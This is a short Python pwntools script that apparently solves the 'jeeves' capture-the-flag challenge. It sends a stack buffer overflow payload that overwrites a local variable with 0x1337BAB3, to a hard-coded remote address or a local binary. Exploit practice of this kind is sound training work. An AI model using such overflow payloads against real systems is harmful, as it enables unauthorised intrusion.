#!/usr/bin/env python3


from pwn import *

BINARY = "./jeeves"
ADDR = "206.189.121.131"
PORT = 30643

splash()
elf = context.binary = ELF(BINARY)


# Correct number to overwrite $rbp-0x4 in jeeves/main()
class Constants:
    answer = 0x1337BAB3


def conn():
    if args.LOCAL:
        pty = process.PTY
        return process(elf.path, stdin=pty, stdout=pty, stderr=pty)

    else:
        return remote(ADDR, PORT)


def solve() -> None:
    io = conn()
    payload = [cyclic(cyclic_find(0x61616170)), Constants.answer]
    io.sendline(flat(payload))
    io.interactive()


if __name__ == "__main__":
    solve()
